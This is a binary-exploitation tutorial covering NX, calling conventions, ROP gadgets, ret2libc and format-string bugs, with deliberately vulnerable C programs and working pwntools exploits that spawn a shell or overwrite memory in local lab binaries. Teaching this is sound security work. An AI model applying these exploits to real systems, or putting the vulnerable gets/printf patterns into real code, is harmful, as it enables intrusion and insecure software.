# Binary Exploitation - Stack

> https://ir0nstone.gitbook.io/notes/

## No eXecute

> The defense against shellcode

As you can expect, programmers were hardly pleased that people could inject their own instructions into the program. The NX bit, which stands for No eXecute, defines areas of memory as either **instructions** or **data**. This means that your input will be stored as **data**, and any attempt to run it as instructions will crash the program, effectively neutralizing the shellcode.

To get around NX, exploit developers have to leverage a technique called **ROP**, Return-Oriented Programming.

The Windows version of NX is DEP, which stands for **D**ata **E**xecution **P**revention

### Checking for NX

You can either use pwntools' `checksec` or `rabin2`.

```bash
$ checksec vuln
[*] 'vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

```bash
$ rabin2 -I vuln
[...]
nx       false
[...]
```

## Return-Oriented Programming

> Bypassing NX

The basis of ROP is chaining together small chunks of code already present within the binary itself in such a way as to do what you wish. This often involves passing parameters to functions already present within `libc`, such as `system` - if you can find the location of a command, such as `cat flag.txt`, and then pass it *as a parameter* to the `system`, it will execute that command and return the output. A more dangerous command is `/bin/sh`, which when run by the `system` gives the attacker a shell much like the shellcode we used did.

Doing this, however, is not as simple as it may seem at first. To be able to properly call functions, we first have to understand how to pass parameters to them.

### Calling Conventions

> A more in-depth look into parameters for 32-bit and 64-bit programs

#### One Parameter

[calling-conventions-one-param](../assets/calling-conventions-one-param.zip)

#### Source

Let's have a quick look at the source:

```c
#include <stdio.h>

void vuln(int check) {
    if(check == 0xdeadbeef) {
        puts("Nice!");
    } else {
        puts("Not nice!");
    }
}

int main() {
    vuln(0xdeadbeef);
    vuln(0xdeadc0de);
}
```

Pretty simple.

If we run the 32-bit and 64-bit versions, we get the same output:

```bash
Nice!
Not nice!
```

Just what we expected.

#### Analyzing 32-bit

Let's open the binary up in radare2 and disassemble it.

```
$ r2 -d -A vuln-32
$ s main; pdf

0x080491ac      8d4c2404       lea ecx, [argv]
0x080491b0      83e4f0         and esp, 0xfffffff0
0x080491b3      ff71fc         push dword [ecx - 4]
0x080491b6      55             push ebp
0x080491b7      89e5           mov ebp, esp
0x080491b9      51             push ecx
0x080491ba      83ec04         sub esp, 4
0x080491bd      e832000000     call sym.__x86.get_pc_thunk.ax
0x080491c2      053e2e0000     add eax, 0x2e3e
0x080491c7      83ec0c         sub esp, 0xc
0x080491ca      68efbeadde     push 0xdeadbeef
0x080491cf      e88effffff     call sym.vuln
0x080491d4      83c410         add esp, 0x10
0x080491d7      83ec0c         sub esp, 0xc
0x080491da      68dec0adde     push 0xdeadc0de
0x080491df      e87effffff     call sym.vuln
0x080491e4      83c410         add esp, 0x10
0x080491e7      b800000000     mov eax, 0
0x080491ec      8b4dfc         mov ecx, dword [var_4h]
0x080491ef      c9             leave
0x080491f0      8d61fc         lea esp, [ecx - 4]
0x080491f3      c3             ret
```

If we look closely at the calls to `sym.vuln`, we see a pattern:

```
push 0xdeadbeef
call sym.vuln
[...]
push 0xdeadc0de
call sym.vuln
```

We literally `push` the parameter to the stack before calling the function. Let's break on `sym.vuln`.

```
[0x080491ac]> db sym.vuln
[0x080491ac]> dc
hit breakpoint at: 8049162
[0x08049162]> pxw @ esp
0xffdeb54c      0x080491d4 0xdeadbeef 0xffdeb624 0xffdeb62c
```

The first value there is the **return pointer** that we talked about before - the second, however, is the parameter. This makes sense because the return pointer gets pushed during the `call`, so it should be at the top of the stack. Now let's disassemble `sym.vuln`.

```
┌ 74: sym.vuln (int32_t arg_8h);
│           ; var int32_t var_4h @ ebp-0x4
│           ; arg int32_t arg_8h @ ebp+0x8
│           0x08049162 b    55             push ebp
│           0x08049163      89e5           mov ebp, esp
│           0x08049165      53             push ebx
│           0x08049166      83ec04         sub esp, 4
│           0x08049169      e886000000     call sym.__x86.get_pc_thunk.ax
│           0x0804916e      05922e0000     add eax, 0x2e92
│           0x08049173      817d08efbead.  cmp dword [arg_8h], 0xdeadbeef
│       ┌─< 0x0804917a      7516           jne 0x8049192
│       │   0x0804917c      83ec0c         sub esp, 0xc
│       │   0x0804917f      8d9008e0ffff   lea edx, [eax - 0x1ff8]
│       │   0x08049185      52             push edx
│       │   0x08049186      89c3           mov ebx, eax
│       │   0x08049188      e8a3feffff     call sym.imp.puts           ; int puts(const char *s)
│       │   0x0804918d      83c410         add esp, 0x10
│      ┌──< 0x08049190      eb14           jmp 0x80491a6
│      │└─> 0x08049192      83ec0c         sub esp, 0xc
│      │    0x08049195      8d900ee0ffff   lea edx, [eax - 0x1ff2]
│      │    0x0804919b      52             push edx
│      │    0x0804919c      89c3           mov ebx, eax
│      │    0x0804919e      e88dfeffff     call sym.imp.puts           ; int puts(const char *s)
│      │    0x080491a3      83c410         add esp, 0x10
│      │    ; CODE XREF from sym.vuln @ 0x8049190
│      └──> 0x080491a6      90             nop
│           0x080491a7      8b5dfc         mov ebx, dword [var_4h]
│           0x080491aa      c9             leave
└           0x080491ab      c3             ret
```

Here I'm showing the **full** output of the command because a lot of it is relevant. `radare2` does a great job of detecting local variables - as you can see at the top, there is one called `arg_8h`. Later this same one is compared to `0xdeadbeef`:

```
cmp dword [arg_8h], 0xdeadbeef
```

Clearly, that's our parameter.

So now we know, when there's one parameter, it gets pushed to the stack so that the stack looks like this:

```
return address        param_1
```

#### Analyzing 64-bit

Let's disassemble the `main` again here.

```
0x00401153      55             push rbp
0x00401154      4889e5         mov rbp, rsp
0x00401157      bfefbeadde     mov edi, 0xdeadbeef
0x0040115c      e8c1ffffff     call sym.vuln
0x00401161      bfdec0adde     mov edi, 0xdeadc0de
0x00401166      e8b7ffffff     call sym.vuln
0x0040116b      b800000000     mov eax, 0
0x00401170      5d             pop rbp
0x00401171      c3             ret
```

Hohoho, it's different. As we mentioned before, the parameter gets moved to `rdi` (in the disassembly here it's `edi`, but `edi` is just the lower 32 bits of `rdi`, and the parameter is only 32 bits long, so it says `EDI` instead). If we break on `sym.vuln` again we can check `rdi` with the command

```
dr rdi
```

> Just `dr` will display all registers

```
[0x00401153]> db sym.vuln 
[0x00401153]> dc
hit breakpoint at: 401122
[0x00401122]> dr rdi
0xdeadbeef
```

Awesome.

> Registers are used for parameters, but the return address is still pushed onto the stack and in ROP is placed right after the function address

#### Multiple Parameters

[calling-convention-multi-param](../assets/calling-convention-multi-param.zip)

#### Source

```c
#include <stdio.h>

void vuln(int check, int check2, int check3) {
    if(check == 0xdeadbeef && check2 == 0xdeadc0de && check3 == 0xc0ded00d) {
        puts("Nice!");
    } else {
        puts("Not nice!");
    }
}

int main() {
    vuln(0xdeadbeef, 0xdeadc0de, 0xc0ded00d);
    vuln(0xdeadc0de, 0x12345678, 0xabcdef10);
}
```

#### 32-bit

We've seen the *full* disassembly of an almost identical binary, so I'll only isolate the important parts.

```
0x080491dd      680dd0dec0     push 0xc0ded00d
0x080491e2      68dec0adde     push 0xdeadc0de
0x080491e7      68efbeadde     push 0xdeadbeef
0x080491ec      e871ffffff     call sym.vuln
[...]
0x080491f7      6810efcdab     push 0xabcdef10
0x080491fc      6878563412     push 0x12345678
0x08049201      68dec0adde     push 0xdeadc0de
0x08049206      e857ffffff     call sym.vuln
```

It's just as simple - `push` them in reverse order of how they're passed in. The reverse order becomes helpful when you `db sym.vuln` and print out the stack.

```
[0x080491bf]> db sym.vuln
[0x080491bf]> dc
hit breakpoint at: 8049162
[0x08049162]> pxw @ esp
0xffb45efc      0x080491f1 0xdeadbeef 0xdeadc0de 0xc0ded00d
```

So it becomes quite clear how more parameters are placed on the stack:

```
return pointer        param1        param2        param3        [...]        paramN
```

#### 64-bit

```
0x00401170      ba0dd0dec0     mov edx, 0xc0ded00d
0x00401175      bedec0adde     mov esi, 0xdeadc0de
0x0040117a      bfefbeadde     mov edi, 0xdeadbeef
0x0040117f      e89effffff     call sym.vuln
0x00401184      ba10efcdab     mov edx, 0xabcdef10
0x00401189      be78563412     mov esi, 0x12345678
0x0040118e      bfdec0adde     mov edi, 0xdeadc0de
0x00401193      e88affffff     call sym.vuln
```

So as well as `rdi`, we also push to `rdx` and `rsi` (or, in this case, their lower 32 bits).

#### Bigger 64-bit values

Just to show that it is in fact ultimately `rdi` and not `edi` that is used, I will alter the original one-parameter code to utilize a bigger number:

```c
#include <stdio.h>

void vuln(long check) {
    if(check == 0xdeadbeefc0dedd00d) {
        puts("Nice!");
    }
}

int main() {
    vuln(0xdeadbeefc0dedd00d);
}
```

If you disassemble the `main`, you can see it disassembles to

```
movabs rdi, 0xdeadbeefc0ded00d
call sym.vuln
```

> `movabs` can be used to encode the `mov` instruction for 64-bit instructions - treat it as if it's a `mov`.

### Gadgets

> Controlling execution with snippets of code

Gadgets are small snippets of code followed by a `ret` instruction, e.g. `pop rdi; ret`. We can manipulate the `ret` of these gadgets in such a way as to string together a large chain of them to do what we want.

#### Example

Let's for a minute pretend the stack looks like this during the execution of a `pop rdi; ret` gadget.

![img](https://1919401647-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MEwBGnjPgf263kl5vWP%2F-MM6rOOHiYqyLab3Pm1G%2F-MM6rsFs6OPZXMxmI27r%2Fimage.png?alt=media&token=0084cb45-876d-4165-9863-578d655eeedd)

What happens is fairly obvious - `0x10` gets popped into `rdi` as it is at the top of the stack during the `pop rdi`. Once the `pop` occurs, `rsp` moves:

![img](https://1919401647-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MEwBGnjPgf263kl5vWP%2F-MM6rOOHiYqyLab3Pm1G%2F-MM6rxCFqvlYzlurxKMW%2Fimage.png?alt=media&token=1dcaf1b8-7ec4-4ad9-b776-105d41c1e003)

And since `ret` is equivalent to `pop rip`, `0x5655576724` gets moved into `rip`. Note how the stack is laid out for this.

#### Utilizing Gadgets

When we overwrite the return pointer, we overwrite the value pointed at by `rsp`. Once that value is popped, it points to the next value at the stack - but wait. We can overwrite the next value in the stack.

Let's say that we want to exploit a binary to jump to a `pop rdi; ret` gadget, pop `0x100` into `rdi` then jump to `flag()`. Let's step-by-step the execution.

![img](https://1919401647-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MEwBGnjPgf263kl5vWP%2F-MM6rOOHiYqyLab3Pm1G%2F-MM6sIO-028Md3bAqC2q%2Fimage.png?alt=media&token=467327d0-ae50-40e4-b38c-d0073e44e926)

On the *original* `ret`, which we overwrite the return pointer for, we pop the gadget address in. Now `rip` moves to point to the gadget, and `rsp` moves to the next memory address.

![img](https://1919401647-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MEwBGnjPgf263kl5vWP%2F-MM6rOOHiYqyLab3Pm1G%2F-MM6siGn5gKQpFIburDO%2Fimage.png?alt=media&token=0b6956b0-05d4-4e85-8f52-3def3ffe7125)

`rsp` moves to the `0x100`; `rip` to the `pop rdi`. Now when we pop, `0x100` gets moved into `rdi`.

![img](https://1919401647-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MEwBGnjPgf263kl5vWP%2F-MM6rOOHiYqyLab3Pm1G%2F-MM6spSm54IYMXI_s_dQ%2Fimage.png?alt=media&token=e785f7f4-2ee3-4c5e-8e23-741ea145be2b)

RSP moves to the next item on the stack, the address of the `flag()`. The `ret` is executed and `flag()` is called.

#### Summary

Essentially, if the gadget pops values from the stack, simply place those values afterward (including the `pop rip` in `ret`). If we want to pop `0x10` into `rdi` and then jump to `0x16`, our payload would look like this:

![img](https://1919401647-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MEwBGnjPgf263kl5vWP%2F-MM6rOOHiYqyLab3Pm1G%2F-MM6tEbSq0eMI851A8U4%2Fimage.png?alt=media&token=d11bfbc0-92d0-437d-9304-7907d59dc4e0)

Note if you have multiple `pop` instructions, you can just add more values.

![img](https://1919401647-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MEwBGnjPgf263kl5vWP%2F-MM6rOOHiYqyLab3Pm1G%2F-MM6tVlFA6IkEX7iFCOH%2Fimage.png?alt=media&token=ed91777f-7d86-4a80-a59b-738a2b4299c5)



> We use `rdi` as an example because, if you remember, that's the register for the first parameter in 64-bit. This means control of this register using this gadget is important.

#### Finding Gadgets

We can use the tool [`ROPgadget`](https://github.com/JonathanSalwan/ROPgadget) to find possible gadgets.

```bash
$ ROPgadget --binary vuln-64

Gadgets information
============================================================
0x0000000000401069 : add ah, dh ; nop dword ptr [rax + rax] ; ret
0x000000000040109b : add bh, bh ; loopne 0x40110a ; nop ; ret
0x0000000000401037 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401024
[...]
```

Combine it with `grep` to look for specific registers.

```bash
$ ROPgadget --binary vuln-64 | grep rdi

0x0000000000401096 : or dword ptr [rdi + 0x404030], edi ; jmp rax
0x00000000004011db : pop rdi ; ret
```

### Exploiting Calling Conventions

> Utilizing Calling Conventions

[exploiting_with_params](../assets/exploiting_with_params.zip)

#### 32-bit

The program expects the stack to be laid out like this before executing the function:

![img](https://1919401647-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MEwBGnjPgf263kl5vWP%2F-MM6tX_UO7c8cF27y2Ki%2F-MM6tmUuoBNDG2SSXDgD%2Fimage.png?alt=media&token=ecc30eba-e85d-405c-9ed8-2dc70899e4c2)

So why don't we provide it like that? As well as the function, we also pass the return address and the parameters.

![img](https://1919401647-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MEwBGnjPgf263kl5vWP%2F-MM6tX_UO7c8cF27y2Ki%2F-MM6twJQMrGMQ0FNLXFY%2Fimage.png?alt=media&token=77918223-9007-4853-a758-99d6c5901ffe)

Everything after the address of `flag()` will be part of the stack frame for the next function as it is **expected** to be there - just instead of using `push` instructions we just overwrote them manually.

```python
from pwn import *

p = process('./vuln-32')

payload = b'A' * 52            # Padding up to EIP
payload += p32(0x080491c7)     # Address of flag()
payload += p32(0x0)            # Return address - don't care if crashes when done
payload += p32(0xdeadc0de)     # First parameter
payload += p32(0xc0ded00d)     # Second parameter

log.info(p.clean())
p.sendline(payload)
log.info(p.clean())
```

#### 64-bit

Same logic, except we have to utilize the gadgets we talked about previously to fill the required registers (in this case `rdi` and `rsi` as we have two parameters).

We have to fill the registers *before* the function is called

```python
from pwn import *

p = process('./vuln-64')

POP_RDI, POP_RSI_R15 = 0x4011fb, 0x4011f9


payload = b'A' * 56            # Padding
payload += p64(POP_RDI)        # pop rdi; ret
payload += p64(0xdeadc0de)     # value into rdi -> first param
payload += p64(POP_RSI_R15)    # pop rsi; pop r15; ret
payload += p64(0xc0ded00d)     # value into rsi -> first param
payload += p64(0x0)            # value into r15 -> not important
payload += p64(0x40116f)       # Address of flag()
payload += p64(0x0)

log.info(p.clean())
p.sendline(payload)
log.info(p.clean())
```

### ret2libc

> The standard ROP exploit

A ret2libc is based on the `system` function found within the C library. This function executes anything passed to it making it the best target. Another thing found within libc is the string `/bin/sh`; if you pass this string to the `system`, it will pop a shell.

And that is the entire basis of it - passing `/bin/sh` as a parameter to the `system`. Doesn't sound too bad, right?

[ret2libc](../assets/ret2libc.zip)

#### Disabling ASLR

To start with, we are going to disable ASLR. ASLR randomizes the location of libc in memory, meaning we cannot (without other steps) work out the location of the `system` and `/bin/sh`. To understand the general theory, we will start with it disabled.

```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

#### Manual Exploitation

##### Getting Libc and its base

Fortunately, Linux has a command called `ldd` for dynamic linking. If we run it on our compiled ELF file, it'll tell us the libraries it uses and their base addresses.

```bash
$ ldd vuln-32 
	linux-gate.so.1 (0xf7fd2000)
	libc.so.6 => /lib32/libc.so.6 (0xf7dc2000)
	/lib/ld-linux.so.2 (0xf7fd3000)
```

We need `libc.so.6`, so the base address of libc is `0xf7dc2000`.

> Libc base and the system and /bin/sh offsets may be different for you. This isn't a problem - it just means you have a different libc version. Make sure you use **your** values.

##### Getting the location of the system()

To call the system, we obviously need its location in memory. We can use the `readelf` command for this.

```bash
$ readelf -s /lib32/libc.so.6 | grep system

1534: 00044f00    55 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.0
```

The `-s` flag tells `readelf` to search for symbols, for example, functions. Here we can find the offset of the system from the libc base is `0x44f00`.

##### Getting the location of /bin/sh

Since `/bin/sh` is just a string, we can use `strings` on the dynamic library we just found with `ldd`. Note that when passing strings as parameters you need to pass a **pointer** to the string, not the hex representation of the string, because that's how C expects it.

```bash
$ strings -a -t x /lib32/libc.so.6 | grep /bin/sh
18c32b /bin/sh
```

`-a` tells it to scan the entire file; `-t x` tells it to output the offset in hex.

##### 32-bit Exploit

```python
from pwn import *

p = process('./vuln-32')

libc_base = 0xf7dc2000
system = libc_base + 0x44f00
binsh = libc_base + 0x18c32b

payload = b'A' * 76         # The padding
payload += p32(system)      # Location of system
payload += p32(0x0)         # return pointer - not important once we get the shell
payload += p32(binsh)       # pointer to command: /bin/sh

p.clean()
p.sendline(payload)
p.interactive()
```

##### 64-bit Exploit

Repeat the process with the `libc` linked to the 64-bit exploit (should be called something like `/lib/x86_64-linux-gnu/libc.so.6`).

Note that instead of passing the parameter in after the return pointer, you will have to use a `pop rdi; ret` gadget to put it into the RDI register.

```bash
$ ROPgadget --binary vuln-64 | grep rdi

[...]
0x00000000004011cb : pop rdi ; ret
```

```python
from pwn import *

p = process('./vuln-64')

libc_base = 0x7ffff7de5000
system = libc_base + 0x48e20
binsh = libc_base + 0x18a143

POP_RDI = 0x4011cb

payload = b'A' * 72         # The padding
payload += p64(POP_RDI)     # gadget -> pop rdi; ret
payload += p64(binsh)       # pointer to command: /bin/sh
payload += p64(system)      # Location of system
payload += p64(0x0)         # return pointer - not important once we get the shell

p.clean()
p.sendline(payload)
p.interactive()
```

#### Automating with Pwntools

Unsurprisingly, pwntools has a bunch of features that make this much simpler.

```python
# 32-bit
from pwn import *

elf = context.binary = ELF('./vuln-32')
p = process()

libc = elf.libc                        # Simply grab the libc it's running with
libc.address = 0xf7dc2000              # Set base address

system = libc.sym['system']            # Grab location of system
binsh = next(libc.search(b'/bin/sh'))  # grab string location

payload = b'A' * 76         # The padding
payload += p32(system)      # Location of system
payload += p32(0x0)         # return pointer - not important once we get the shell
payload += p32(binsh)       # pointer to command: /bin/sh

p.clean()
p.sendline(payload)
p.interactive()
```

The 64-bit looks essentially the same.

> Pwntools can simplify it even more with its ROP capabilities, but I won't showcase them here.

## Format String Bug

> Reading memory off the stack

Format String is a dangerous bug that is easily exploitable. If manipulated correctly, you can leverage it to perform powerful actions such as reading from and writing to arbitrary memory locations.

### Why it exists

In C, certain functions can take "format specifier" within strings. Let's look at an example:

```c
int value = 1205;

printf("Decimal: %d\nFloat: %f\nHex: 0x%x", value, (double) value, value);
```

This prints out:

```
Decimal: 1205
Float: 1205.000000
Hex: 0x4b5
```

So, it replaced `%d` with the value, `%f` with the float value and `%x` with the hex representation.

This is a nice way in C of formatting strings (string concatenation is quite complicated in C). Let's try print out the same value in hex 3 times:

```c
int value = 1205;

printf("%x %x %x", value, value, value);
```

As expected, we get

```
4b5 4b5 4b5
```

What happens, however, if we *don't have enough arguments for all the format specifiers*?

```c
int value = 1205;

printf("%x %x %x", value);
```

```
4b5 5659b000 565981b0
```

Erm... what happened here?

The key here is that `printf` expects as many parameters as format string specifiers, and in 32-bit it grabs these parameters from the stack. If there aren't enough parameters on the stack, it'll just *grab the next values* - essentially *leaking values off the stack*. And that's what makes it so dangerous.

### How to abuse this

Surely if it's a bug in the code, the attacker can't do much, right? Well, the real issue is when C code takes user-provided input and prints it out using `printf`.

[fmtstr_arb_read](../assets/fmtstr_arb_read.zip)

```c
#include <stdio.h>

int main(void) {
    char buffer[30];
    
    gets(buffer);

    printf(buffer);
    return 0;
}
```

If we run this normally, it works as expected:

```bash
$ ./test 

yes
yes
```

But what happens if we input a format string specifier, such as `%x`?

```bash
$ ./test

%x %x %x %x %x
f7f74080 0 5657b1c0 782573fc 20782520
```

It reads values off the stack and returns them as the developer wasn't expecting so many format string specifiers. 

### Choosing Offsets

To print the same value 3 times, using

```c
printf("%x %x %x", value, value, value);
```

Gets tedious - so, there is a better way in C.

```c
printf("%1$x %1$x %1$x", value);
```

The `1$` between tells printf to use the **first parameter**. However, this also means that attackers can read values an arbitrary offset from the top of the stack - say we know there is a canary at the 6th `%p` - instead of sending `%p %p %p %p %p %p`, we can just do `%6$p`. This allows us to be much more efficient.

### Arbitrary Reads

In C, when you want to use a string you use a **pointer** to the start of the string - this is essentially a value that represents a memory address. So when you use the `%s` format specifier, it's the *pointer* that gets passed to it. That means instead of reading a value of the stack, you read *the value in the memory address it points at*.

Now this is all very *interesting* - if you can find a value on the stack that happens to correspond to where you want to read, that is. But what if we could specify where we want to read? Well... we can.

Let's look back at the previous program and its output:

```bash
$ ./test

%x %x %x %x %x %x
f7f74080 0 5657b1c0 782573fc 20782520 25207825
```

You may notice that the last two values contain the hex values of `%x `. That's because we're reading the buffer. Here it's at the 4th offset - if we can write an address and then point `%s` at it, we can get an arbitrary write!

```bash
$ ./vuln 

ABCD|%6$p
ABCD|0x44434241
```

> `%p` is a pointer; generally, it returns the same as `%x` just precedes it with a `0x` which makes it stand out more

As we can see, we're reading the value we inputted. Let's write a quick pwntools script that writes the location of the ELF file and reads it with `%s` - if all goes well, it should read the first bytes of the file, which is always `\x7fELF`. Start with the basics:

```python
from pwn import *

p = process('./vuln')

payload = p32(0x41424344)
payload += b'|%6$p'

p.sendline(payload)
log.info(p.clean())
```

```bash
$ python3 exploit.py

[+] Starting local process './vuln': pid 3204
[*] b'DCBA|0x41424344'
```

Nice it works. The base address of the binary is `0x8048000`, so let's replace the `0x41424344` with that and read it with `%s`:

```python
from pwn import *

p = process('./vuln')

payload = p32(0x8048000)
payload += b'|%6$s'

p.sendline(payload)
log.info(p.clean())
```

It doesn't work.

The reason it doesn't work is that `printf` stops at null bytes, and the very first character is a null byte. We have to put the format specifier first.

```python
from pwn import *

p = process('./vuln')

payload = b'%8$p||||'
payload += p32(0x8048000)

p.sendline(payload)
log.info(p.clean())
```

Let's break down the payload:

- We add 4 `|` because we want the address we write to fill one memory address, not half of one and half another, because that will result in reading the wrong address
- The offset is `%8$p` because the start of the buffer is generally at `%6$p`. However, memory addresses are 4 bytes long each and we already have 8 bytes, so it's two memory addresses further along at `%8$p`. 

```bash
$ python3 exploit.py

[+] Starting local process './vuln': pid 3255
[*] b'0x8048000||||'
```

> It still stops at the null byte, but that's not important because we get the output; the address is still written to memory, just not printed back.

Now let's replace the `p` with an `s`.

```bash
$ python3 exploit.py

[+] Starting local process './vuln': pid 3326
[*] b'\x7fELF\x01\x01\x01||||'
```

Of course, `%s` will **also** stop at a null byte as strings in C are terminated with them. We have worked out, however, that the first bytes of an ELF file up to a null byte is `\x7fELF\x01\x01\x01`.

### Arbitrary Writes

Luckily C contains a rarely-used format specifier `%n`. This specifier takes in a pointer (memory address) and writes there the *number of characters written so far*. If we can control the input, we can control how many characters are written and also where we write them.

Obviously, there is a *small* flaw - to write, say, `0x8048000` to a memory address, we would have to write that many characters - and generally buffers aren't quite that big. Luckily there are other format string specifiers for that. I fully recommend you watch [this video](https://www.youtube.com/watch?v=t1LH9D5cuK4) to completely understand it, but let's jump into a basic binary.

[fmtstr_arb_write](../assets/fmtstr_arb_write.zip)

```c
#include <stdio.h>

int auth = 0;

int main() {
    char password[100];

    puts("Password: ");
    fgets(password, sizeof password, stdin);
    
    printf(password);
    printf("Auth is %i\n", auth);

    if(auth == 10) {
        puts("Authenticated!");
    }
}
```

Simple - we need to overwrite the variable `auth` with the value 10. Format string vulnerability is obvious, but there's also no buffer overflow due to a secure `fgets`.

#### Work out the location of auth

As it's a global variable, it's within the binary itself. We can check the location using `readelf` to check for symbols.

```bash
$ readelf -s auth | grep auth
    34: 00000000     0 FILE    LOCAL  DEFAULT  ABS auth.c
    57: 0804c028     4 OBJECT  GLOBAL DEFAULT   24 auth
```

The location of `auth` is `0x0804c028`.

#### Writing the Exploit

We're lucky there are no null bytes, so there's no need to change the order.

```bash
$ ./auth 

Password: 
%p %p %p %p %p %p %p %p %p
0x64 0xf7f9f580 0x8049199 (nil) 0x1 0xf7ff5980 0x25207025 0x70252070 0x20702520
```

Buffer is the 7th `%p`.

```python
from pwn import *

AUTH = 0x804c028

p = process('./auth')

payload = p32(AUTH)
payload += b'|' * 6         # We need to write the value 10, AUTH is 4 bytes, so we need 6 more for %n
payload += b'%7$n'


print(p.clean().decode('latin-1'))
p.sendline(payload)
print(p.clean().decode('latin-1'))
```

And easy peasy:

```
[+] Starting local process './auth': pid 4045
Password: 

[*] Process './auth' stopped with exit code 0 (pid 4045)
(À\x04||||||
Auth is 10
Authenticated!
```

### Pwntools

As you can expect, pwntools has a handy feature for automating `%n` format string exploits:

```python
payload = fmtstr_payload(offset, {location : value})
```

The `offset` in this case is `7` because the 7th `%p` read the buffer; the location is **where** you want to write it and the value is **what**. Note that you can add as many location-value pairs into the dictionary as you want.

```python
payload = fmtstr_payload(7, {AUTH : 10})
```

You can also grab the location of the `auth` symbol with pwntools:

```python
elf = ELF('./auth')
AUTH = elf.sym['auth']
```

> Check out the pwntools tutorials for more cool features